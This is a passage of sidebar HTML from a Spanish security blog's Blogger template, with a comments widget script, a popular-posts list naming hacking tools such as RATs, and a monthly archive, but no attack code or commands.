<a class='quickedit' href='//www.blogger.com/rearrange?blogID=9133539773684103848&widgetType=HTML&widgetId=HTML10&action=editWidget&sectionId=sidebar' onclick='return _WidgetManager._PopupConfig(document.getElementById("HTML10"));' target='configHTML10' title='Editar'>
<img alt='' height='18' src='https://resources.blogblog.com/img/icon18_wrench_allbkg.png' width='18'/>
</a>
</span>
</span>
<div class='clear'></div>
</div><div class='widget Stats' data-version='1' id='Stats1'>
<h2>
Número de visitas
</h2>
<div class='widget-content'>
<div id='Stats1_content' style='display: none;'>
<img alt='Sparkline' height='30' id='Stats1_sparkline' width='75'/>
<span class='counter-wrapper text-counter-wrapper' id='Stats1_totalCount'></span>
<div class='clear'></div>
<span class='widget-item-control'>
<span class='item-control blog-admin'>
<a class='quickedit' href='//www.blogger.com/rearrange?blogID=9133539773684103848&widgetType=Stats&widgetId=Stats1&action=editWidget&sectionId=sidebar' onclick='return _WidgetManager._PopupConfig(document.getElementById("Stats1"));' target='configStats1' title='Editar'>
<img alt='' height='18' src='https://resources.blogblog.com/img/icon18_wrench_allbkg.png' width='18'/>
</a>
</span>
</span>
<div class='clear'></div>
</div>
</div>
</div><div class='widget Image' data-version='1' id='Image3'>
<h2>h-c0n - I CON de Hackplayers</h2>
<div class='widget-content'>
<a href='http://www.h-c0n.com'>
<img alt='h-c0n - I CON de Hackplayers' height='368' id='Image3_img' src='http://3.bp.blogspot.com/-F6UTjrfUP5g/Wl_lO4f6giI/AAAAAAABDPI/Q_6IlMYQZdsx5-wEi0Bhbf2SUaJNK9ucwCK4BGAYYCw/s1600/CARTEL%2BVERTICAL%2Bv4%2Bpeq%2B%2528copia%2529.jpg' width='260'/>
</a>
<br/>
<span class='caption'>&#161;Nos vemos en la h-c0n!</span>
</div>
<div class='clear'></div>
<span class='widget-item-control'>
<span class='item-control blog-admin'>
<a class='quickedit' href='//www.blogger.com/rearrange?blogID=9133539773684103848&widgetType=Image&widgetId=Image3&action=editWidget&sectionId=sidebar' onclick='return _WidgetManager._PopupConfig(document.getElementById("Image3"));' target='configImage3' title='Editar'>
<img alt='' height='18' src='https://resources.blogblog.com/img/icon18_wrench_allbkg.png' width='18'/>
</a>
</span>
</span>
<div class='clear'></div>
</div><div class='widget HTML' data-version='1' id='HTML5'>
<h2 class='title'>
Comentarios recientes
</h2>
<div class='widget-content'>
<style type="text/css">
ul.w2b_recent_comments {
    list-style: none;
    margin: 0;
    padding: 0;
}

.w2b_recent_comments li {
    background: none !important;
    margin: 0 0 6px !important;
    padding: 0 0 6px 0 !important;
    display: block;
    clear: both;
    overflow: hidden;
    list-style: none;
}

.w2b_recent_comments li .avatarImage {
    padding: 3px;
    background: #fefefe;
    -webkit-box-shadow: 0 1px 1px #ccc;
    -moz-box-shadow: 0 1px 1px #ccc;
    box-shadow: 0 1px 1px #ccc;
    float: left;
    margin: 0 6px 0 0;
    position: relative;
    overflow: hidden;
}

.avatarRound {
    -webkit-border-radius: 100px;
    -moz-border-radius: 100px;
    border-radius: 100px;
}

.w2b_recent_comments li img {
    padding: 0px;
    position: relative;
    overflow: hidden;
    display: block;
}

.w2b_recent_comments li span {
    margin-top: 4px;
    color: #666;
    display: block;
    font-size: 12px;
    font-style: italic;
    line-height: 1.4;
}
</style>
    <script type="text/javascript">
    //<![CDATA[
        // Recent Comments Settings
        var
        numComments     = 8,
        showAvatar     = true,
        avatarSize     = 40,
        roundAvatar    = false,
        characters     = 100,
        showMorelink    = true,
        moreLinktext    = "Más ?",
        defaultAvatar     = "http://www.gravatar.com/avatar/?d=mm",
        hideCredits    = true;
		

function w2b_recent_comments(w2b) {
    var commentsHtml;
    commentsHtml = '<ul class="w2b_recent_comments">';
    for (var i = 0; i < numComments; i++) {
        var commentlink, authorName, authorAvatar, avatarClass;
        if (i == w2b.feed.entry.length) break;
        commentsHtml += "<li>";
        var entry = w2b.feed.entry[i];
        for (var l = 0; l < entry.link.length; l++) {
            if (entry.link[l].rel == 'alternate') {
                commentlink = entry.link[l].href;
                break
            }
        }
        authorName = entry.author[0].name.$t;
        authorAvatar = entry.author[0].gd$image.src;
        if (authorAvatar.indexOf("/s1600/") != -1) {
            authorAvatar = authorAvatar.replace("/s1600/", "/s" + avatarSize + "-c/")
        } else if (authorAvatar.indexOf("/s220/") != -1) {
            authorAvatar = authorAvatar.replace("/s220/", "/s" + avatarSize + "-c/")
        } else if (authorAvatar.indexOf("/s512-c/") != -1 && authorAvatar.indexOf("http:") !== 0) {
            authorAvatar = "http:" + authorAvatar.replace("/s512-c/", "/s" + avatarSize + "-c/")
        } else if (authorAvatar.indexOf("blogblog.com/img/b16-rounded.gif") != -1) {
            authorAvatar = "http://3.bp.blogspot.com/-AaI8-1X32ZM/TxMKLVzQ5BI/AAAAAAAABYY/QYau8ov2blE/s" + avatarSize + "/w2b_blogger_logo.png"
        } else if (authorAvatar.indexOf("blogblog.com/img/openid16-rounded.gif") != -1) {
            authorAvatar = "http://3.bp.blogspot.com/-9lSeVyNRKx0/TxMKMIqMNuI/AAAAAAAABYc/8iasY0xpLzc/s" + avatarSize + "/w2b_openid_logo.png"
        } else if (authorAvatar.indexOf("blogblog.com/img/blank.gif") != -1) {
            if (defaultAvatar.indexOf("gravatar.com") != -1) {
                authorAvatar = defaultAvatar + "&s=" + avatarSize
            } else {
                authorAvatar = defaultAvatar
            }
        } else {
            authorAvatar = authorAvatar
        }
        if (showAvatar === true) {
            if (roundAvatar === true) {
                avatarClass = "avatarRound"
            } else {
                avatarClass = ""
            }
            commentsHtml += "<div class=\"avatarImage " + avatarClass + "\"><img class=\"" + avatarClass + "\" src=\"" + authorAvatar + "\" alt=\"" + authorName + "\" width=\"" + avatarSize + "\" height=\"" + avatarSize + "\"/></div>"
        }
        commentsHtml += "<a href=\"" + commentlink + "\">" + authorName + "</a>";
        var commHTML = entry.content.$t;
        var commBody = commHTML.replace(/(<([^>]+)>)/ig, "");
        if (commBody !== "" && commBody.length > characters) {
            commBody = commBody.substring(0, characters);
            commBody += "&hellip;";
            if (showMorelink === true) {
                commBody += "<a href=\"" + commentlink + "\">" + moreLinktext + "</a>"
            }
        } else {
            commBody = commBody
        }
        commentsHtml += "<span>" + commBody + "</span>";
        commentsHtml += "</li>"
    }
    commentsHtml += '</ul>';
    var hideCSS = "";
    if (hideCredits === true) {
        hideCSS = "display:none;"
    }
    commentsHtml += "<span style=\"font-size:10px;display:block;text-align:right;" + hideCSS + "\">Widget by <a href=\"http://www.way2blogging.org/\">Way2Blogging</a></span>";
    document.write(commentsHtml)
}
    //]]>
    </script>

	<script type="text/javascript" src="http://hackplayers.blogspot.com/feeds/comments/default?alt=json&callback=w2b_recent_comments&max-results=8"></script>
</div>
<div class='clear'></div>
<span class='widget-item-control'>
<span class='item-control blog-admin'>
<a class='quickedit' href='//www.blogger.com/rearrange?blogID=9133539773684103848&widgetType=HTML&widgetId=HTML5&action=editWidget&sectionId=sidebar' onclick='return _WidgetManager._PopupConfig(document.getElementById("HTML5"));' target='configHTML5' title='Editar'>
<img alt='' height='18' src='https://resources.blogblog.com/img/icon18_wrench_allbkg.png' width='18'/>
</a>
</span>
</span>
<div class='clear'></div>
</div><div class='widget Image' data-version='1' id='Image4'>
<h2>Camisetas y sudaderas</h2>
<div class='widget-content'>
<a href='http://camisetasfrikis.es/colaboraciones/927-hackplayers.html?from=hplayers'>
<img alt='Camisetas y sudaderas' height='242' id='Image4_img' src='http://2.bp.blogspot.com/-GI3g6XlkuQM/WnscZQnn0cI/AAAAAAABD_4/Y96y4Bk1JecHXYozN-8BEsR-lCLHxIywQCK4BGAYYCw/s242/camisetasfrikis.png' width='242'/>
</a>
<br/>
</div>
<div class='clear'></div>
<span class='widget-item-control'>
<span class='item-control blog-admin'>
<a class='quickedit' href='//www.blogger.com/rearrange?blogID=9133539773684103848&widgetType=Image&widgetId=Image4&action=editWidget&sectionId=sidebar' onclick='return _WidgetManager._PopupConfig(document.getElementById("Image4"));' target='configImage4' title='Editar'>
<img alt='' height='18' src='https://resources.blogblog.com/img/icon18_wrench_allbkg.png' width='18'/>
</a>
</span>
</span>
<div class='clear'></div>
</div><div class='widget PopularPosts' data-version='1' id='PopularPosts1'>
<h2>
Entradas populares del mes
</h2>
<div class='widget-content popular-posts'>
<ul>
<li>
<div class='item-content'>
<div class='item-thumbnail'>
<a href='http://www.hackplayers.com/2014/04/8-servicios-proxy-gratuitos-para-evitar.html' target='_blank'>
<img alt='' border='0' height='72' src='https://4.bp.blogspot.com/-Sxbb8e9-nQ8/U1flJagdSsI/AAAAAAAAXj8/lyMHaS0Ot5o/s72-c/proxy_door.png' width='72'/>
</a>
</div>
<div class='item-title'>
<a href='http://www.hackplayers.com/2014/04/8-servicios-proxy-gratuitos-para-evitar.html'>
8 servicios proxy gratuitos para evitar restricciones y mantener el anonimato y la privacidad
</a>
</div>
<div class='item-snippet'>
  Hace tiempo hablábamos de algunos servicios VPN gratuitos  que nos permitían evadir ciertas restricciones de navegación web y mantener la ...
</div>
</div>
<div style='clear: both;'></div>
</li>
<li>
<div class='item-content'>
<div class='item-thumbnail'>
<a href='http://www.hackplayers.com/2014/03/como-desproteger-un-excel-con-password.html' target='_blank'>
<img alt='' border='0' height='72' src='http://1.bp.blogspot.com/-KOQl25YEX8g/UzV5NZAb8NI/AAAAAAAAW1w/V_hPojgJCt8/s72-c/excel_cifrar_password.png' width='72'/>
</a>
</div>
<div class='item-title'>
<a href='http://www.hackplayers.com/2014/03/como-desproteger-un-excel-con-password.html'>
El abc para desproteger un Excel con contraseña
</a>
</div>
<div class='item-snippet'>
Desde que soy consultor de seguridad una de las herramientas que más utilizo de mi arsenal de hacking es... Excel ٩(&#865;&#3663;&#815;&#865;&#3663;)۶ ... y cómo este ...
</div>
</div>
<div style='clear: both;'></div>
</li>
<li>
<div class='item-content'>
<div class='item-thumbnail'>
<a href='http://www.hackplayers.com/2015/01/necesitas-un-hacker-echa-un-vistazo-lista.html' target='_blank'>
<img alt='' border='0' height='72' src='https://1.bp.blogspot.com/-NilP-zhCn3s/VLw9DGblMRI/AAAAAAAAe7c/cW7FrZ1HR0M/s72-c/hackerslist.png' width='72'/>
</a>
</div>
<div class='item-title'>
<a href='http://www.hackplayers.com/2015/01/necesitas-un-hacker-echa-un-vistazo-lista.html'>
&#191;Necesitas un hacker? Echa un vistazo a la Lista de Hackers
</a>
</div>
<div class='item-snippet'>
 La llamada Lista de Hackers  está dando de que hablar mucho en los últimos días. Se trata de un sitio de alquiler de hackers profesionales ...
</div>
</div>
<div style='clear: both;'></div>
</li>
<li>
<div class='item-content'>
<div class='item-thumbnail'>
<a href='http://www.hackplayers.com/2018/02/grupos-de-telegram-sobre-hacking-y.html' target='_blank'>
<img alt='' border='0' height='72' src='https://1.bp.blogspot.com/-FVeFNvpL_1c/WoN3zZoxqdI/AAAAAAABEbo/Y89X1UFMHrUxBXUL3oj5iGfnLS9XldGlQCLcBGAs/s72-c/putin-telegram-700x394.jpg' width='72'/>
</a>
</div>
<div class='item-title'>
<a href='http://www.hackplayers.com/2018/02/grupos-de-telegram-sobre-hacking-y.html'>
Grupos de Telegram sobre hacking y seguridad informática en español
</a>
</div>
<div class='item-snippet'>
 Casi me atrevo a decir que el IRC de los hackers del siglo XXI, o si acaso de esta década, es Telegram. Evidentemente no es el único medio ...
</div>
</div>
<div style='clear: both;'></div>
</li>
<li>
<div class='item-content'>
<div class='item-thumbnail'>
<a href='http://www.hackplayers.com/2018/03/29-tipos-de-ataque-usb-distintos.html' target='_blank'>
<img alt='' border='0' height='72' src='https://1.bp.blogspot.com/-RNvvKDzNn8U/Wqusu0EnQMI/AAAAAAABFNE/Q9OeLlKmFNEq2XDR7Sj4YtOvUWT49aHugCLcBGAs/s72-c/usb_ataque.png' width='72'/>
</a>
</div>
<div class='item-title'>
<a href='http://www.hackplayers.com/2018/03/29-tipos-de-ataque-usb-distintos.html'>
29 tipos de ataque USB distintos
</a>
</div>
<div class='item-snippet'>
   Un grupo de investigadores de la Universidad Ben-Gurion de Negev en Israel publicó el año pasado en la revista ScienceDirect un interesan...
</div>
</div>
<div style='clear: both;'></div>
</li>
<li>
<div class='item-content'>
<div class='item-thumbnail'>
<a href='http://www.hackplayers.com/2015/10/listado-de-codigos-secretos-de-android.html' target='_blank'>
<img alt='' border='0' height='72' src='http://2.bp.blogspot.com/-3HWY8Pf3PNM/VjQADIVNuOI/AAAAAAAAsfk/1dJEI_fTF8g/s72-c/android_secret_codes.jpg' width='72'/>
</a>
</div>
<div class='item-title'>
<a href='http://www.hackplayers.com/2015/10/listado-de-codigos-secretos-de-android.html'>
Listado de códigos secretos de Android
</a>
</div>
<div class='item-snippet'>
  Casi desde el nacimiento de los teléfonos móviles existen códigos secretos para activar diversas funciones y realizar diferentes diagnósti...
</div>
</div>
<div style='clear: both;'></div>
</li>
<li>
<div class='item-content'>
<div class='item-thumbnail'>
<a href='http://www.hackplayers.com/2018/03/quasarrat-un-rat-free-y-open-source-para-windows.html' target='_blank'>
<img alt='' border='0' height='72' src='https://2.bp.blogspot.com/-PQ4zg4XmjWk/Wp1hgXRNsUI/AAAAAAABE7M/IJdvNJHY8iUQw-z0ks9H7KE6mvAiihi8gCLcBGAs/s72-c/QuasarRAT.png' width='72'/>
</a>
</div>
<div class='item-title'>
<a href='http://www.hackplayers.com/2018/03/quasarrat-un-rat-free-y-open-source-para-windows.html'>
QuasarRAT: un RAT libre y open source para Windows
</a>
</div>
<div class='item-snippet'>
 Quasar es una herramienta de administración remota (RAT) rápida y liviana programada en C#. Es una buena solución de administración remota ...
</div>
</div>
<div style='clear: both;'></div>
</li>
<li>
<div class='item-content'>
<div class='item-thumbnail'>
<a href='http://www.hackplayers.com/2013/05/androrat-un-troyano-rat-para-android.html' target='_blank'>
<img alt='' border='0' height='72' src='http://1.bp.blogspot.com/-mpTAWl4z2C4/UaUlWdpCEiI/AAAAAAAANYw/4hti8agn5RA/s72-c/android_rat.jpg' width='72'/>
</a>
</div>
<div class='item-title'>
<a href='http://www.hackplayers.com/2013/05/androrat-un-troyano-rat-para-android.html'>
androrat: un troyano RAT para Android
</a>
</div>
<div class='item-snippet'>
  Androrat  es un RAT (Remote Administration Tool) de c ódigo abierto para Android . Se trata de una aplicación cliente-servidor desarrollad...
</div>
</div>
<div style='clear: both;'></div>
</li>
<li>
<div class='item-content'>
<div class='item-thumbnail'>
<a href='http://www.hackplayers.com/2018/03/mimic-ocultar-procesos-en-linux.html' target='_blank'>
<img alt='' border='0' height='72' src='https://2.bp.blogspot.com/-jo3NbdATW78/WpneGGrUeEI/AAAAAAABE1A/rbKMigXvjUc1HVDrITnHxNGkjoy_8_kxQCLcBGAs/s72-c/mimic.png' width='72'/>
</a>
</div>
<div class='item-title'>
<a href='http://www.hackplayers.com/2018/03/mimic-ocultar-procesos-en-linux.html'>
Mimic: una herramienta para ocultar procesos en Linux incluso sin privilegios
</a>
</div>
<div class='item-snippet'>
   Mimic es una herramienta para la ejecución encubierta de procesos en Linux x86_64.  Para ello, Mimic puede lanzar cualquier programa y ha...
</div>
</div>
<div style='clear: both;'></div>
</li>
<li>
<div class='item-content'>
<div class='item-thumbnail'>
<a href='http://www.hackplayers.com/2018/03/writeups-ctf-forociber2018.html' target='_blank'>
<img alt='' border='0' height='72' src='https://2.bp.blogspot.com/-ypC9QCewtdw/WprjMbBXWJI/AAAAAAABE44/ocl-vmAjtX8HHlCI-v5z6vHcN0Wd7uYowCLcBGAs/s72-c/no_es_ctf_para_viejos.png' width='72'/>
</a>
</div>
<div class='item-title'>
<a href='http://www.hackplayers.com/2018/03/writeups-ctf-forociber2018.html'>
Writeups CTF ForoCiber2018
</a>
</div>
<div class='item-snippet'>
 Este martes con motivo del II Forociber, la Universidad de Extremadura junto con la empresa Viewnext abría un pequeño CTF de 72 horas de du...
</div>
</div>
<div style='clear: both;'></div>
</li>
</ul>
<div class='clear'></div>
<span class='widget-item-control'>
<span class='item-control blog-admin'>
<a class='quickedit' href='//www.blogger.com/rearrange?blogID=9133539773684103848&widgetType=PopularPosts&widgetId=PopularPosts1&action=editWidget&sectionId=sidebar' onclick='return _WidgetManager._PopupConfig(document.getElementById("PopularPosts1"));' target='configPopularPosts1' title='Editar'>
<img alt='' height='18' src='https://resources.blogblog.com/img/icon18_wrench_allbkg.png' width='18'/>
</a>
</span>
</span>
<div class='clear'></div>
</div>
</div><div class='widget Image' data-version='1' id='Image1'>
<h2>Visita el foro de la Comunidad</h2>
<div class='widget-content'>
<a href='https://foro.hackplayers.com'>
<img alt='Visita el foro de la Comunidad' height='194' id='Image1_img' src='http://4.bp.blogspot.com/-0eBCrHmreSw/WH1DD6lN3zI/AAAAAAAA4VU/kFrD5ve9dBgxkzsv9QogagIn8VP2EB3swCK4B/s242/foro_hackplayers_2.png' width='242'/>
</a>
<br/>
</div>
<div class='clear'></div>
<span class='widget-item-control'>
<span class='item-control blog-admin'>
<a class='quickedit' href='//www.blogger.com/rearrange?blogID=9133539773684103848&widgetType=Image&widgetId=Image1&action=editWidget&sectionId=sidebar' onclick='return _WidgetManager._PopupConfig(document.getElementById("Image1"));' target='configImage1' title='Editar'>
<img alt='' height='18' src='https://resources.blogblog.com/img/icon18_wrench_allbkg.png' width='18'/>
</a>
</span>
</span>
<div class='clear'></div>
</div><div class='widget BlogArchive' data-version='1' id='BlogArchive1'>
<h2>
Archivo del blog
</h2>
<div class='widget-content'>
<div class='ltr' id='ArchiveList'>
<div id='BlogArchive1_ArchiveList'>
<ul>
<li class='archivedate expanded'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=close&toggle=YEARLY-1514761200000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy toggle-open'>
                            &#9660; 
                          </span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2018/'>
2018
</a>
<span class='post-count' dir='ltr'>
                            (
                            45
                            )
                          </span>
<ul>
<li class='archivedate expanded'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=close&toggle=MONTHLY-1519858800000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy toggle-open'>
                            &#9660; 
                          </span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2018/03/'>
marzo
</a>
<span class='post-count' dir='ltr'>
                            (
                            11
                            )
                          </span>
<ul class='posts'>
<li>
<a href='http://www.hackplayers.com/2018/03/hardware-reversing-firmware-y-uefi-by-guillermo.html'>
Hardware reversing (firmware y UEFI) (by Guillermo...
</a>
</li>
<li>
<a href='http://www.hackplayers.com/2018/03/29-tipos-de-ataque-usb-distintos.html'>
29 tipos de ataque USB distintos
</a>
</li>
<li>
<a href='http://www.hackplayers.com/2018/03/sudohulk-privesc-cambiando-sudo.html'>
Intentando escalar privilegios cambiando el comand...
</a>
</li>
<li>
<a href='http://www.hackplayers.com/2018/03/hacking-con-python-by-daniel-echeverri.html'>
Hacking con Python (by Daniel Echeverri #hc0n2018)...
</a>
</li>
<li>
<a href='http://www.hackplayers.com/2018/03/langhost-un-backdoor-en-tu-rpi-con-telegram.html'>
lanGhost: un backdoor en tu Raspberry Pi controlad...
</a>
</li>
<li>
<a href='http://www.hackplayers.com/2018/03/tophat-un-rat-fud-con-una-shell-cifrada.html'>
TopHat: un RAT FuD con una shell cifrada con RSA
</a>
</li>
<li>
<a href='http://www.hackplayers.com/2018/03/ctfr-exprimiendo-la-transparencia-de.html'>
CTFR, exprimiendo la transparencia de los certific...
</a>
</li>
<li>
<a href='http://www.hackplayers.com/2018/03/cuckoonroll-by-andriy-brukhovetskyy.html'>
Cuckoo&#39;n&#39;Roll (by Andriy Brukhovetskyy #hc0n2018)
</a>
</li>
<li>
<a href='http://www.hackplayers.com/2018/03/quasarrat-un-rat-free-y-open-source-para-windows.html'>
QuasarRAT: un RAT libre y open source para Windows...
</a>
</li>
<li>
<a href='http://www.hackplayers.com/2018/03/writeups-ctf-forociber2018.html'>
Writeups CTF ForoCiber2018
</a>
</li>
<li>
<a href='http://www.hackplayers.com/2018/03/mimic-ocultar-procesos-en-linux.html'>
Mimic: una herramienta para ocultar procesos en Li...
</a>
</li>
</ul>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1517439600000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2018/02/'>
febrero
</a>
<span class='post-count' dir='ltr'>
                            (
                            16
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1514761200000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2018/01/'>
enero
</a>
<span class='post-count' dir='ltr'>
                            (
                            18
                            )
                          </span>
</li>
</ul>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=YEARLY-1483225200000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2017/'>
2017
</a>
<span class='post-count' dir='ltr'>
                            (
                            204
                            )
                          </span>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1512082800000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2017/12/'>
diciembre
</a>
<span class='post-count' dir='ltr'>
                            (
                            16
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1509490800000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2017/11/'>
noviembre
</a>
<span class='post-count' dir='ltr'>
                            (
                            19
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1506808800000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2017/10/'>
octubre
</a>
<span class='post-count' dir='ltr'>
                            (
                            19
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1504216800000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2017/09/'>
septiembre
</a>
<span class='post-count' dir='ltr'>
                            (
                            15
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1501538400000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2017/08/'>
agosto
</a>
<span class='post-count' dir='ltr'>
                            (
                            15
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1498860000000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2017/07/'>
julio
</a>
<span class='post-count' dir='ltr'>
                            (
                            17
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1496268000000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2017/06/'>
junio
</a>
<span class='post-count' dir='ltr'>
                            (
                            19
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1493589600000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2017/05/'>
mayo
</a>
<span class='post-count' dir='ltr'>
                            (
                            18
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1490997600000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2017/04/'>
abril
</a>
<span class='post-count' dir='ltr'>
                            (
                            17
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1488322800000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2017/03/'>
marzo
</a>
<span class='post-count' dir='ltr'>
                            (
                            17
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1485903600000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2017/02/'>
febrero
</a>
<span class='post-count' dir='ltr'>
                            (
                            16
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1483225200000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2017/01/'>
enero
</a>
<span class='post-count' dir='ltr'>
                            (
                            16
                            )
                          </span>
</li>
</ul>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=YEARLY-1451602800000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2016/'>
2016
</a>
<span class='post-count' dir='ltr'>
                            (
                            213
                            )
                          </span>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1480546800000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2016/12/'>
diciembre
</a>
<span class='post-count' dir='ltr'>
                            (
                            17
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1477954800000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2016/11/'>
noviembre
</a>
<span class='post-count' dir='ltr'>
                            (
                            16
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1475272800000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2016/10/'>
octubre
</a>
<span class='post-count' dir='ltr'>
                            (
                            18
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1472680800000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2016/09/'>
septiembre
</a>
<span class='post-count' dir='ltr'>
                            (
                            18
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1470002400000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2016/08/'>
agosto
</a>
<span class='post-count' dir='ltr'>
                            (
                            15
                            )
                          </span>
</li>
</ul>
<ul>
